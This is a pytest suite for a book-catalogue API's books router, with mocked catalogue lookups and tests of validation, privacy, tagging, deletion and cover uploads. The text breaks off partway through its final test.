"""Tests for backend/routers/books.py.

Outbound calls to Open Library and Google Books are intercepted with respx so
the suite never touches the network.
"""

import ast
import csv
import inspect
import io
import json
import sys
import types
import typing
from base64 import b64encode
from collections import defaultdict, deque
from collections.abc import Sequence
from pathlib import Path

import httpx
import pytest
import respx
from fastapi.responses import StreamingResponse
from sqlalchemy.orm import Query

import catalogue
import covers
import credentials
import marc
import settings_store
import sources
import targets
from database import SessionLocal
from enums import (
    CatalogueSource,
    ClassificationScheme,
    ExportFormat,
    ReadStatus,
    SettingKey,
    TagCategory,
)
from models import (
    DESCRIPTION_MAX,
    MAX_PAGE_NUMBER_IN_A_BOOK,
    PUBLISHER_MAX,
    SUBTITLE_MAX,
    TITLE_MAX,
    Book,
    Classification,
    Collection,
    Tag,
    User,
    UserBook,
)
from reading import Reading
from routers import books as books_router
from shelf import Loading, Shelf
from tests.helpers import (
    AT_OPEN_LIBRARY_COVERS,
    JPEG_BYTES,
    NOT_AN_IMAGE,
    PNG_BYTES,
    enable_google_books,
    items,
    peak_rows,
    rows_at_the_engine,
    selects_for,
    silence_covers,
    silence_sru_catalogues,
    titles,
)

OPEN_LIBRARY_ISBN = "https://openlibrary.org/isbn/9780743273565.json"
OPEN_LIBRARY_AUTHOR = "https://openlibrary.org/authors/OL123A.json"
GOOGLE_BOOKS = "https://www.googleapis.com/books/v1/volumes"
DNB = "https://services.dnb.de/sru/dnb"
K10PLUS = "https://sru.k10plus.de/opac-de-627"

#: An SRU response holding no records. Both remaining SRU sources answer 200
#: with an empty set rather than a 404, so mocking a 404 would test a case the
#: real services never produce.
SRU_EMPTY = """<?xml version="1.0" encoding="UTF-8"?>
<zs:searchRetrieveResponse xmlns:zs="http://www.loc.gov/zing/srw/">
 <zs:numberOfRecords>0</zs:numberOfRecords><zs:records/>
</zs:searchRetrieveResponse>
"""


def _sru_empty() -> httpx.Response:
    return httpx.Response(200, text=SRU_EMPTY, headers={"content-type": "text/xml"})


def leaves(body: object) -> list[object]:
    """Every scalar a JSON body carries, at any depth.

    So a test can ask what a response discloses anywhere in it rather than in
    the one field it happens to know about.
    """
    if isinstance(body, dict):
        return [leaf for value in body.values() for leaf in leaves(value)]
    if isinstance(body, list):
        return [leaf for value in body for leaf in leaves(value)]
    return [body]


@pytest.fixture
def open_library_hit():
    """Open Library answers with a complete record.

    The fast pair has to be silenced. Open Library is a fallback now, reached
    only once the DNB and K10plus have both said they do not hold the book.
    """
    with respx.mock(assert_all_called=False) as mock:
        mock.get(url__startswith=DNB).mock(return_value=_sru_empty())
        mock.get(url__startswith=K10PLUS).mock(return_value=_sru_empty())
        silence_sru_catalogues(mock)
        mock.get(OPEN_LIBRARY_ISBN).mock(
            return_value=httpx.Response(
                200,
                json={
                    "title": "The Great Gatsby",
                    "subtitle": "A Novel",
                    "authors": [{"key": "/authors/OL123A"}],
                    "publishers": ["Scribner"],
                    "publish_date": "April 10, 1925",
                    "description": {"value": "A story of the Jazz Age."},
                    "subjects": ["Literary Fiction", "Historical Fiction"],
                },
            )
        )
        mock.get(OPEN_LIBRARY_AUTHOR).mock(
            return_value=httpx.Response(200, json={"name": "F. Scott Fitzgerald"})
        )
        # A cover is checked before it is stored, so a successful lookup now
        # reaches the image services too. This fixture is the "Open Library
        # has it" case, so its cover service answers with a real image; the
        # DNB's has nothing for an English ISBN.
        mock.get(url__startswith=AT_OPEN_LIBRARY_COVERS).mock(
            return_value=httpx.Response(
                200, content=JPEG_BYTES, headers={"content-type": "image/jpeg"}
            )
        )
        silence_covers(mock)
        yield mock


#: An SRU response for an ISBN the DNB does not hold. It answers 200 with zero
#: records rather than a 404, so mocking a 404 here would test a case the real
#: service never produces.
DNB_EMPTY = """<?xml version="1.0" encoding="UTF-8"?>
<searchRetrieveResponse xmlns="http://www.loc.gov/zing/srw/">
 <numberOfRecords>0</numberOfRecords><records/>
</searchRetrieveResponse>
"""


@pytest.fixture
def open_library_miss():
    """Every free source misses, leaving Google Books as the answer.

    All three have to be silenced explicitly: respx fails a test that makes an
    unmocked request rather than letting it reach the real service.
    """
    with respx.mock(assert_all_called=False) as mock:
        mock.get(url__startswith="https://openlibrary.org/").mock(
            return_value=httpx.Response(404)
        )
        mock.get(url__startswith=DNB).mock(return_value=_sru_empty())
        mock.get(url__startswith=K10PLUS).mock(return_value=_sru_empty())
        silence_sru_catalogues(mock)
        silence_covers(mock)
        yield mock


#: One DNB SRU record, trimmed to the fields the parser reads. The awkward
#: shapes are the real ones: the translator sits in 700 with a relator that
#: keeps him out of the credit line, and the subject heading carries a GND
#: number where the Dewey number in 082 carries none.
DNB_RECORD = """<?xml version="1.0" encoding="UTF-8"?>
<searchRetrieveResponse xmlns="http://www.loc.gov/zing/srw/">
 <numberOfRecords>1</numberOfRecords>
 <records><record><recordData>
  <record xmlns="http://www.loc.gov/MARC21/slim">
   <datafield tag="020" ind1=" " ind2=" ">
    <subfield code="a">9783960092353</subfield>
   </datafield>
   <datafield tag="041" ind1=" " ind2=" ">
    <subfield code="a">ger</subfield>
   </datafield>
   <datafield tag="082" ind1="7" ind2="4">
    <subfield code="a">004</subfield>
   </datafield>
   <datafield tag="100" ind1="1" ind2=" ">
    <subfield code="a">Kane, Sean P.</subfield>
    <subfield code="4">aut</subfield>
   </datafield>
   <datafield tag="245" ind1="1" ind2="0">
    <subfield code="a">Praxiswissen Docker</subfield>
    <subfield code="b">Grundlagen und Best Practices</subfield>
    <subfield code="c">Sean P. Kane mit Karl Matthias</subfield>
   </datafield>
   <datafield tag="264" ind1=" " ind2="1">
    <subfield code="a">Heidelberg</subfield>
    <subfield code="b">O'Reilly</subfield>
    <subfield code="c">2024</subfield>
   </datafield>
   <datafield tag="300" ind1=" " ind2=" ">
    <subfield code="a">390 Seiten</subfield>
   </datafield>
   <datafield tag="650" ind1=" " ind2="7">
    <subfield code="0">(DE-588)4026894-9</subfield>
    <subfield code="a">Informatik</subfield>
    <subfield code="2">gnd</subfield>
   </datafield>
   <datafield tag="700" ind1="1" ind2=" ">
    <subfield code="a">Demmig, Thomas</subfield>
    <subfield code="4">trl</subfield>
   </datafield>
  </record>
 </recordData></record></records>
</searchRetrieveResponse>
"""


@pytest.fixture
def dnb_hit():
    """The DNB answers, and nothing else is reachable.

    A 978-3 ISBN leads with the DNB, so everything else is mocked as a miss to
    prove the German record is what came back rather than a fallback.
    """
    with respx.mock(assert_all_called=False) as mock:
        mock.get(url__startswith=K10PLUS).mock(return_value=_sru_empty())
        mock.get(url__startswith=DNB).mock(
            return_value=httpx.Response(
                200, text=DNB_RECORD, headers={"content-type": "text/xml"}
            )
        )
        # After the DNB route, never before: routes resolve in registration
        # order and this one is a catch-all over every SRU target.
        silence_sru_catalogues(mock)
        mock.get(url__startswith="https://openlibrary.org/").mock(
            return_value=httpx.Response(404)
        )
        mock.get(url__startswith=GOOGLE_BOOKS).mock(
            return_value=httpx.Response(200, json={"items": []})
        )
        silence_covers(mock)
        yield mock


class TestListTags:
    def test_returns_the_seeded_tags(self, client, admin):
        tags = client.get("/api/books/tags", headers=admin["headers"]).json()
        names = {t["name"] for t in tags}
        assert {"Fiction", "Non-Fiction", "Fantasy", "Adult"} <= names

    def test_every_tag_has_a_known_category(self, client, admin):
        tags = client.get("/api/books/tags", headers=admin["headers"]).json()
        assert {t["category"] for t in tags} == {"type", "genre", "age"}

    def test_requires_authentication(self, client):
        assert client.get("/api/books/tags").status_code == 401

    def test_seeding_is_idempotent(self, client, admin):
        """seed_tags() runs on every boot; a restart must not duplicate rows."""
        import main

        before = len(client.get("/api/books/tags", headers=admin["headers"]).json())
        main.seed_tags()
        after = len(client.get("/api/books/tags", headers=admin["headers"]).json())
        assert before == after


class TestIsbnLookup:
    def test_maps_open_library_fields(self, client, admin, open_library_hit):
        body = client.get(
            "/api/books/lookup", params={"isbn": "9780743273565"}, headers=admin["headers"]
        ).json()
        assert body["title"] == "The Great Gatsby"
        assert body["subtitle"] == "A Novel"
        assert body["author"] == "F. Scott Fitzgerald"
        assert body["publisher"] == "Scribner"

    def test_extracts_the_year_from_a_prose_date(self, client, admin, open_library_hit):
        body = client.get(
            "/api/books/lookup", params={"isbn": "9780743273565"}, headers=admin["headers"]
        ).json()
        assert body["year"] == 1925

    def test_unwraps_a_dict_shaped_description(self, client, admin, open_library_hit):
        """Open Library returns description as either a string or {"value": ...}."""
        body = client.get(
            "/api/books/lookup", params={"isbn": "9780743273565"}, headers=admin["headers"]
        ).json()
        assert body["description"] == "A story of the Jazz Age."

    def test_suggests_tags_matching_the_subjects(self, client, admin, db, open_library_hit):
        body = client.get(
            "/api/books/lookup", params={"isbn": "9780743273565"}, headers=admin["headers"]
        ).json()
        suggested = {
            db.get(Tag, tag_id).name for tag_id in body["suggested_tag_ids"]
        }
        assert "Literary Fiction" in suggested
        assert "Historical Fiction" in suggested

    def test_falls_back_to_google_books(self, client, admin, db, open_library_miss):
        enable_google_books(db)
        open_library_miss.get(url__startswith=GOOGLE_BOOKS).mock(
            return_value=httpx.Response(
                200,
                json={
                    "items": [
                        {
                            "volumeInfo": {
                                "title": "Dune",
                                "authors": ["Frank Herbert", "Brian Herbert"],
                                "publisher": "Chilton",
                                "publishedDate": "1965-08-01",
                                "industryIdentifiers": [
                                    {"type": "ISBN_13", "identifier": "9780441013593"}
                                ],
                                "categories": ["Science Fiction"],
                            }
                        }
                    ]
                },
            )
        )
        body = client.get(
            "/api/books/lookup", params={"isbn": "9780743273565"}, headers=admin["headers"]
        ).json()
        assert body["title"] == "Dune"
        assert body["year"] == 1965

    def test_google_books_joins_multiple_authors(self, client, admin, db, open_library_miss):
        enable_google_books(db)
        open_library_miss.get(url__startswith=GOOGLE_BOOKS).mock(
            return_value=httpx.Response(
                200,
                json={
                    "items": [
                        {"volumeInfo": {"title": "Dune", "authors": ["Frank Herbert", "Brian Herbert"]}}
                    ]
                },
            )
        )
        body = client.get(
            "/api/books/lookup", params={"isbn": "9780743273565"}, headers=admin["headers"]
        ).json()
        assert body["author"] == "Frank Herbert, Brian Herbert"

    def test_every_source_missing_is_404(self, client, admin, open_library_miss):
        open_library_miss.get(url__startswith=GOOGLE_BOOKS).mock(
            return_value=httpx.Response(200, json={"items": []})
        )
        res = client.get(
            "/api/books/lookup", params={"isbn": "9780743273565"}, headers=admin["headers"]
        )
        assert res.status_code == 404

    def test_a_throttled_source_is_503_not_404(self, client, admin, db, open_library_miss):
        enable_google_books(db)
        """A quota that will reset is not the same answer as "no such book".

        A 404 sends the reader off to type the whole record in by hand. This
        was the live failure: Google throttled every keyless request and the
        API reported each one as a book nobody has ever catalogued.
        """
        open_library_miss.get(url__startswith=GOOGLE_BOOKS).mock(
            return_value=httpx.Response(429)
        )
        res = client.get(
            "/api/books/lookup", params={"isbn": "9780743273565"}, headers=admin["headers"]
        )
        assert res.status_code == 503
        assert "rate limiting" in res.json()["detail"]

    def test_a_german_isbn_resolves_from_the_dnb(self, client, admin, dnb_hit):
        body = client.get(
            "/api/books/lookup", params={"isbn": "9783960092353"}, headers=admin["headers"]
        ).json()
        assert body["title"] == "Praxiswissen Docker"
        assert body["subtitle"] == "Grundlagen und Best Practices"
        assert body["author"] == "Sean P. Kane"
        assert body["publisher"] == "O'Reilly"
        assert body["year"] == 2024
        assert body["language"] == "de"
        assert body["page_count"] == 390

    def test_a_repeat_lookup_does_not_call_the_source_again(
        self, client, admin, open_library_hit
    ):
        """Holding a barcode in frame produces the same ISBN many times a second."""
        for _ in range(3):
            client.get(
                "/api/books/lookup",
                params={"isbn": "9780743273565"},
                headers=admin["headers"],
            )
        edition_calls = [
            call
            for call in open_library_hit.calls
            if call.request.url.path == "/isbn/9780743273565.json"
        ]
        assert len(edition_calls) == 1

    def test_a_lone_surrogate_in_a_json_answer_is_mojibake_and_not_a_500(
        self, client, admin
    ):
        """`json.loads` turns a `\\ud800` escape into a surrogate with no
        partner, which no encoder writes back out, so serialising the lookup
        answered 500. `fetch.Fetched.json` now repairs it, the way `.text`
        repairs a charset that decodes to one. The escape is written by
        `json.dumps`, as any server's encoder may write it."""
        body = json.dumps({"title": "A\ud800B", "publishers": ["Scribner"]}).encode()
        assert b"\\ud800" in body
        with respx.mock(assert_all_called=False) as mock:
            mock.get(url__startswith=DNB).mock(return_value=_sru_empty())
            mock.get(url__startswith=K10PLUS).mock(return_value=_sru_empty())
            silence_sru_catalogues(mock)
            mock.get(OPEN_LIBRARY_ISBN).mock(return_value=httpx.Response(200, content=body))
            silence_covers(mock)
            res = client.get(
                "/api/books/lookup",
                params={"isbn": "9780743273565"},
                headers=admin["headers"],
            )

        assert res.status_code == 200, res.text
        assert res.json()["title"] == "A\N{REPLACEMENT CHARACTER}B"

    def test_short_isbn_is_rejected_before_any_request(self, client, admin):
        res = client.get("/api/books/lookup", params={"isbn": "123"}, headers=admin["headers"])
        assert res.status_code == 422

    def test_requires_authentication(self, client):
        assert client.get("/api/books/lookup", params={"isbn": "9780743273565"}).status_code == 401

    def test_a_unicode_digit_isbn_is_rejected_rather_than_raising(
        self, client, member
    ):
        """**A 500 out of the router, executed against the app.**

        `978` and ten superscript twos is thirteen characters, so it passed the
        length bound, and `str.isdigit()` is true of `U+00B2` while `int()`
        refuses it. `isbn.parse` raised `ValueError` at
        `routers/books.py`'s lookup, unguarded. Fixed in `isbn.is_valid_isbn13`
        with an `isascii()`, so every caller inherits it rather than one route.

        A **member** token rather than an admin one, because the point is that
        any account could reach it.
        """
        res = client.get(
            "/api/books/lookup",
            params={"isbn": "978" + "\u00b2" * 10},
            headers=member["headers"],
        )
        assert res.status_code == 400


class TestAddBook:
    def test_creates_a_book(self, client, admin):
        res = client.post(
            "/api/books", json={"title": "Book", "author": "Author"}, headers=admin["headers"]
        )
        assert res.status_code == 201
        assert res.json()["title"] == "Book"

    def test_records_who_added_it(self, client, member, make_book):
        book = make_book(member["headers"])
        assert book["added_by"]["username"] == "member"

    def test_new_book_starts_unread(self, client, admin, make_book):
        assert make_book(admin["headers"])["my_status"] == "unread"

    def test_duplicate_isbn_is_409(self, client, admin, make_book):
        make_book(admin["headers"], isbn="9780743273565")
        res = client.post(
            "/api/books",
            json={"title": "Same ISBN", "isbn": "9780743273565"},
            headers=admin["headers"],
        )
        assert res.status_code == 409

    def test_a_unicode_digit_isbn_cannot_forge_a_second_copy(
        self, client, admin, make_book
    ):
        """**The quiet half, and the worse one.**

        `978316148410` and an Arabic-Indic zero is thirteen `isdigit()`
        characters whose checksum `int()` computes happily, so this returned 201
        and stored a string that is not the ISBN anybody typed.
        `uq_books_isbn_single_copy` then saw a different book, which is the one
        thing that column exists to prevent.

        The ASCII spelling of the same ISBN is created first, so this asserts the
        forgery is refused rather than that the route refuses everything.
        """
        make_book(admin["headers"], isbn="9783161484100")
        res = client.post(
            "/api/books",
            json={"title": "Forged", "isbn": "978316148410\u0660"},
            headers=admin["headers"],
        )
        assert res.status_code == 422
        assert len(items(client.get("/api/books", headers=admin["headers"]))) == 1

    def test_books_without_isbn_do_not_collide(self, client, admin, make_book):
        """A NULL isbn column is exempt from the unique constraint by design."""
        make_book(admin["headers"], title="One")
        make_book(admin["headers"], title="Two")
        assert len(items(client.get("/api/books", headers=admin["headers"]))) == 2

    def test_title_is_required(self, client, admin):
        res = client.post("/api/books", json={"author": "No Title"}, headers=admin["headers"])
        assert res.status_code == 422

    def test_scan_endpoint_creates_a_book_too(self, client, admin):
        res = client.post(
            "/api/books/scan", json={"title": "Scanned"}, headers=admin["headers"]
        )
        assert res.status_code == 201

    def test_scan_rejects_a_duplicate_isbn(self, client, admin, make_book):
        make_book(admin["headers"], isbn="9780441013593")
        res = client.post(
            "/api/books/scan",
            json={"title": "Dup", "isbn": "9780441013593"},
            headers=admin["headers"],
        )
        assert res.status_code == 409

    def test_requires_authentication(self, client):
        assert client.post("/api/books", json={"title": "X"}).status_code == 401


class TestListBooks:
    def test_empty_library_returns_an_empty_list(self, client, admin):
        assert items(client.get("/api/books", headers=admin["headers"])) == []

    def test_search_matches_the_title(self, client, admin, make_book):
        make_book(admin["headers"], title="The Hobbit")
        make_book(admin["headers"], title="Dune")
        found = items(client.get("/api/books", params={"q": "hobbit"}, headers=admin["headers"]))
        assert [b["title"] for b in found] == ["The Hobbit"]

    def test_search_matches_the_author(self, client, admin, make_book):
        make_book(admin["headers"], title="A", author="Ursula K. Le Guin")
        make_book(admin["headers"], title="B", author="Frank Herbert")
        found = items(client.get("/api/books", params={"q": "le guin"}, headers=admin["headers"]))
        assert [b["title"] for b in found] == ["A"]

    def test_search_matches_the_isbn(self, client, admin, make_book):
        make_book(admin["headers"], title="A", isbn="9780441013593")
        found = items(client.get("/api/books", params={"q": "9780441"}, headers=admin["headers"]))
        assert len(found) == 1

    def test_search_is_case_insensitive(self, client, admin, make_book):
        make_book(admin["headers"], title="The Hobbit")
        found = items(client.get("/api/books", params={"q": "HOBBIT"}, headers=admin["headers"]))
        assert len(found) == 1

    def test_default_sort_is_title_ascending(self, client, admin, make_book):
        for title in ("Zebra", "Apple", "Mango"):
            make_book(admin["headers"], title=title)
        assert titles(client.get("/api/books", headers=admin["headers"])) == ["Apple", "Mango", "Zebra"]

    @pytest.mark.parametrize(
        ("sort", "expected"),
        [
            ("title_desc", ["Zebra", "Mango", "Apple"]),
            ("year_asc", ["Apple", "Mango", "Zebra"]),
            ("year_desc", ["Zebra", "Mango", "Apple"]),
        ],
    )
    def test_sort_options(self, client, admin, make_book, sort, expected):
        make_book(admin["headers"], title="Zebra", year=2020)
        make_book(admin["headers"], title="Apple", year=2000)
        make_book(admin["headers"], title="Mango", year=2010)
        listing = client.get("/api/books", params={"sort": sort}, headers=admin["headers"])
        assert titles(listing) == expected

    def test_status_filter_counts_books_with_no_row_as_unread(self, client, admin, make_book):
        """A book only gets a user_books row once its status is set."""
        make_book(admin["headers"], title="Never Touched")
        read_me = make_book(admin["headers"], title="Read")
        client.put(
            f"/api/books/{read_me['id']}/status", json={"status": "read"}, headers=admin["headers"]
        )
        unread = items(client.get(
            "/api/books", params={"status": "unread"}, headers=admin["headers"]
        ))
        assert [b["title"] for b in unread] == ["Never Touched"]

    def test_status_filter_finds_read_books(self, client, admin, make_book):
        book = make_book(admin["headers"], title="Read")
        make_book(admin["headers"], title="Unread")
        client.put(
            f"/api/books/{book['id']}/status", json={"status": "read"}, headers=admin["headers"]
        )
        found = items(client.get("/api/books", params={"status": "read"}, headers=admin["headers"]))
        assert [b["title"] for b in found] == ["Read"]

    def test_tag_filter_narrows_the_list(self, client, admin, make_book, db):
        fantasy = db.query(Tag).filter(Tag.name == "Fantasy").one()
        tagged = make_book(admin["headers"], title="Tagged")
        make_book(admin["headers"], title="Untagged")
        client.post(f"/api/books/{tagged['id']}/tags/{fantasy.id}", headers=admin["headers"])
        found = items(client.get(
            "/api/books", params={"tags": str(fantasy.id)}, headers=admin["headers"]
        ))
        assert [b["title"] for b in found] == ["Tagged"]

    def test_multiple_tags_are_combined_with_and(self, client, admin, make_book, db):
        fantasy = db.query(Tag).filter(Tag.name == "Fantasy").one()
        adult = db.query(Tag).filter(Tag.name == "Adult").one()
        both = make_book(admin["headers"], title="Both")
        one = make_book(admin["headers"], title="One")
        for tag in (fantasy, adult):
            client.post(f"/api/books/{both['id']}/tags/{tag.id}", headers=admin["headers"])
        client.post(f"/api/books/{one['id']}/tags/{fantasy.id}", headers=admin["headers"])
        found = items(client.get(
            "/api/books", params={"tags": f"{fantasy.id},{adult.id}"}, headers=admin["headers"]
        ))
        assert [b["title"] for b in found] == ["Both"]

    def test_non_numeric_tag_ids_are_ignored(self, client, admin, make_book):
        make_book(admin["headers"], title="A")
        res = client.get("/api/books", params={"tags": "abc,"}, headers=admin["headers"])
        assert res.status_code == 200

    def test_requires_authentication(self, client):
        assert client.get("/api/books").status_code == 401


class TestPrivacy:
    def test_a_private_book_is_hidden_from_other_users(self, client, admin, member, make_book):
        make_book(admin["headers"], title="Secret", is_private=True)
        assert items(client.get("/api/books", headers=member["headers"])) == []

    def test_the_owner_still_sees_their_private_book(self, client, admin, make_book):
        make_book(admin["headers"], title="Secret", is_private=True)
        assert len(items(client.get("/api/books", headers=admin["headers"]))) == 1

    def test_fetching_someone_elses_private_book_is_404_not_403(
        self, client, admin, member, make_book
    ):
        """404 rather than 403: a 403 would confirm the book exists."""
        book = make_book(admin["headers"], title="Secret", is_private=True)
        res = client.get(f"/api/books/{book['id']}", headers=member["headers"])
        assert res.status_code == 404

    def test_owner_can_toggle_privacy(self, client, admin, make_book):
        book = make_book(admin["headers"])
        res = client.patch(
            f"/api/books/{book['id']}/privacy", json={"is_private": True}, headers=admin["headers"]
        )
        assert res.status_code == 200
        assert res.json()["is_private"] is True

    def test_a_non_owner_cannot_toggle_privacy(self, client, member, other_user, make_book):
        book = make_book(member["headers"])
        res = client.patch(
            f"/api/books/{book['id']}/privacy",
            json={"is_private": True},
            headers=other_user["headers"],
        )
        assert res.status_code == 403

    def test_an_admin_may_override_privacy(self, client, admin, member, make_book):
        book = make_book(member["headers"])
        res = client.patch(
            f"/api/books/{book['id']}/privacy", json={"is_private": True}, headers=admin["headers"]
        )
        assert res.status_code == 200

    def test_private_books_are_excluded_from_search(self, client, admin, member, make_book):
        make_book(admin["headers"], title="Secret Dune", is_private=True)
        found = items(client.get("/api/books", params={"q": "dune"}, headers=member["headers"]))
        assert found == []


class TestGetBook:
    def test_returns_the_book(self, client, admin, make_book):
        book = make_book(admin["headers"], title="Findable")
        res = client.get(f"/api/books/{book['id']}", headers=admin["headers"])
        assert res.status_code == 200
        assert res.json()["title"] == "Findable"

    def test_unknown_id_is_404(self, client, admin):
        assert client.get("/api/books/9999", headers=admin["headers"]).status_code == 404

    def test_export_is_not_matched_as_a_book_id(self, client, admin):
        """Route order matters: /export is declared before /{book_id}."""
        res = client.get("/api/books/export", headers=admin["headers"])
        assert res.status_code == 200
        assert "text/csv" in res.headers["content-type"]


class TestUpdateStatus:
    @pytest.mark.parametrize("status", ["unread", "reading", "read"])
    def test_accepts_each_valid_status(self, client, admin, make_book, status):
        book = make_book(admin["headers"])
        res = client.put(
            f"/api/books/{book['id']}/status", json={"status": status}, headers=admin["headers"]
        )
        assert res.status_code == 200
        assert res.json()["my_status"] == status

    def test_rejects_an_unknown_status(self, client, admin, make_book):
        book = make_book(admin["headers"])
        res = client.put(
            f"/api/books/{book['id']}/status", json={"status": "abandoned"}, headers=admin["headers"]
        )
        assert res.status_code == 422

    def test_status_is_per_user(self, client, admin, member, make_book):
        book = make_book(admin["headers"])
        client.put(
            f"/api/books/{book['id']}/status", json={"status": "read"}, headers=admin["headers"]
        )
        seen_by_member = client.get(f"/api/books/{book['id']}", headers=member["headers"]).json()
        assert seen_by_member["my_status"] == "unread"

    def test_updating_twice_overwrites_rather_than_duplicating(self, client, admin, make_book, db):
        from models import UserBook

        book = make_book(admin["headers"])
        for status in ("reading", "read"):
            client.put(
                f"/api/books/{book['id']}/status", json={"status": status}, headers=admin["headers"]
            )
        assert db.query(UserBook).filter(UserBook.book_id == book["id"]).count() == 1

    def test_unknown_book_is_404(self, client, admin):
        res = client.put("/api/books/9999/status", json={"status": "read"}, headers=admin["headers"])
        assert res.status_code == 404


class TestTagging:
    @pytest.fixture
    def fantasy(self, db) -> Tag:
        return db.query(Tag).filter(Tag.name == "Fantasy").one()

    def test_adding_a_tag(self, client, admin, make_book, fantasy):
        book = make_book(admin["headers"])
        res = client.post(f"/api/books/{book['id']}/tags/{fantasy.id}", headers=admin["headers"])
        assert res.status_code == 200
        assert [t["name"] for t in res.json()["tags"]] == ["Fantasy"]

    def test_adding_the_same_tag_twice_is_a_no_op(self, client, admin, make_book, fantasy):
        book = make_book(admin["headers"])
        client.post(f"/api/books/{book['id']}/tags/{fantasy.id}", headers=admin["headers"])
        res = client.post(f"/api/books/{book['id']}/tags/{fantasy.id}", headers=admin["headers"])
        assert len(res.json()["tags"]) == 1

    def test_removing_a_tag(self, client, admin, make_book, fantasy):
        book = make_book(admin["headers"])
        client.post(f"/api/books/{book['id']}/tags/{fantasy.id}", headers=admin["headers"])
        res = client.delete(f"/api/books/{book['id']}/tags/{fantasy.id}", headers=admin["headers"])
        assert res.json()["tags"] == []

    def test_removing_a_tag_the_book_lacks_is_a_no_op(self, client, admin, make_book, fantasy):
        book = make_book(admin["headers"])
        res = client.delete(f"/api/books/{book['id']}/tags/{fantasy.id}", headers=admin["headers"])
        assert res.status_code == 200

    def test_unknown_tag_is_404(self, client, admin, make_book):
        book = make_book(admin["headers"])
        res = client.post(f"/api/books/{book['id']}/tags/9999", headers=admin["headers"])
        assert res.status_code == 404

    def test_unknown_book_is_404(self, client, admin, fantasy):
        res = client.post(f"/api/books/9999/tags/{fantasy.id}", headers=admin["headers"])
        assert res.status_code == 404


class TestDeleteBook:
    def test_deletes(self, client, admin, make_book):
        book = make_book(admin["headers"])
        assert client.delete(f"/api/books/{book['id']}", headers=admin["headers"]).status_code == 204
        assert client.get(f"/api/books/{book['id']}", headers=admin["headers"]).status_code == 404

    def test_unknown_id_is_404(self, client, admin):
        assert client.delete("/api/books/9999", headers=admin["headers"]).status_code == 404

    def test_deleting_keeps_the_notes_so_a_restore_is_whole(
        self, client, admin, make_book, db
    ):
        """A trashed book keeps everything hanging off it.

        This used to cascade, and the cascade is what made a delete final.
        Restoring a book without its notes would be re-adding it, not undoing
        anything.
        """
        from models import Note

        book = make_book(admin["headers"])
        client.post(
            f"/api/books/{book['id']}/notes", json={"content": "note"}, headers=admin["headers"]
        )
        client.delete(f"/api/books/{book['id']}", headers=admin["headers"])
        assert db.query(Note).filter(Note.book_id == book["id"]).count() == 1

    def test_deleting_keeps_the_loans(self, client, admin, member, make_book, db):
        from models import Loan

        book = make_book(admin["headers"])
        client.post(
            "/api/loans",
            json={"book_id": book["id"], "loaned_to_user_id": member["user"]["id"]},
            headers=admin["headers"],
        )
        client.delete(f"/api/books/{book['id']}", headers=admin["headers"])
        assert db.query(Loan).filter(Loan.book_id == book["id"]).count() == 1

    def test_purging_cascades_to_notes(self, client, admin, make_book, db):
        """The cascade did not go away, it moved to the irreversible verb."""
        from models import Note

        book = make_book(admin["headers"])
        client.post(
            f"/api/books/{book['id']}/notes", json={"content": "note"}, headers=admin["headers"]
        )
        client.delete(f"/api/books/{book['id']}", headers=admin["headers"])
        client.delete(f"/api/books/{book['id']}/permanent", headers=admin["headers"])
        assert db.query(Note).filter(Note.book_id == book["id"]).count() == 0

    def test_purging_cascades_to_loans(self, client, admin, member, make_book, db):
        from models import Loan

        book = make_book(admin["headers"])
        client.post(
            "/api/loans",
            json={"book_id": book["id"], "loaned_to_user_id": member["user"]["id"]},
            headers=admin["headers"],
        )
        client.delete(f"/api/books/{book['id']}", headers=admin["headers"])
        client.delete(f"/api/books/{book['id']}/permanent", headers=admin["headers"])
        assert db.query(Loan).filter(Loan.book_id == book["id"]).count() == 0


class TestCoverUpload:
    def test_uploads_and_points_the_book_at_the_file(
        self, client, admin, make_book, covers_dir
    ):
        book = make_book(admin["headers"])
        res = client.post(
            f"/api/books/{book['id']}/cover",
            files={"file": ("cover.png", PNG_BYTES, "image/png")},
            headers=admin["headers"],
        )
        assert res.status_code == 200
        assert res.json()["cover_url"] == f"/covers/{book['id']}.png"
        assert (covers_dir / f"{book['id']}.png").exists()

    def test_rejects_a_disallowed_extension(self, client, admin, make_book, covers_dir):
        book = make_book(admin["headers"])
        res = client.post(
            f"/api/books/{book['id']}/cover",
            files={"file": ("payload.svg", NOT_AN_IMAGE, "image/svg+xml")},
            headers=admin["headers"],
        )
        assert res.status_code == 400

    def test_replacing_a_cover_removes_the_previous_file(
        self, client, admin, make_book, covers_dir
    ):
        book = make_book(admin["headers"])
        client.post(
            f"/api/books/{book['id']}/cover",
            files={"file": ("a.png", PNG_BYTES, "image/png")},
            headers=admin["headers"],
        )
        client.post(
            f"/api/books/{book['id']}/cover",
            files={"file": ("b.jpg", JPEG_BYTES, "image/jpeg")},
            headers=admin["headers"],
        )
        assert not (covers_dir / f"{book['id']}.png").exists()
        assert (covers_dir / f"{book['id']}.jpg").exists()

    def test_unknown_book_is_404(self, client, admin, covers_dir):
        res = client.post(
            "/api/books/9999/cover",
            files={"file": ("a.png", PNG_BYTES, "image/png")},
            headers=admin["headers"],
        )
        assert res.status_code == 404


@pytest.fixture
def open_library_oversized():
    """Open Library answers with values no column on the Book can hold.

    A broken or compromised upstream rather than a hostile Member: this is the
    only way values of this shape reach the refresh route, which writes nine
    columns straight off the record.
    """
    with respx.mock(assert_all_called=False) as mock:
        mock.get(url__startswith=DNB).mock(return_value=_sru_empty())
        mock.get(url__startswith=K10PLUS).mock(return_value=_sru_empty())
        silence_sru_catalogues(mock)
        mock.get(OPEN_LIBRARY_ISBN).mock(
            return_value=httpx.Response(
                200,
                json={
                    "title": "T" * (TITLE_MAX + 1),
                    "subtitle": "S" * (SUBTITLE_MAX + 1),
                    "publishers": ["P" * (PUBLISHER_MAX + 1)],
                    "publish_date": "April 10, 1925",
                    "description": {"value": "D" * (DESCRIPTION_MAX + 1)},
                    "number_of_pages": MAX_PAGE_NUMBER_IN_A_BOOK + 1,
                },
            )
        )
        mock.get(url__startswith=AT_OPEN_LIBRARY_COVERS).mock(
            return_value=httpx.Response(
                200, content=JPEG_BYTES, headers={"content-type": "image/jpeg"}
            )
        )
        silence_covers(mock)
        yield mock


class TestRefreshMetadata:
    def test_overwrites_fields_from_the_source(self, client, admin, make_book, open_library_hit):
        book = make_book(admin["headers"], title="Stale", isbn="9780743273565")
        res = client.put(f"/api/books/{book['id']}/refresh", headers=admin["headers"])
        assert res.status_code == 200
        assert res.json()["title"] == "The Great Gatsby"

    def test_keeps_a_locally_uploaded_cover(
        self, client, admin, make_book, covers_dir, open_library_hit
    ):
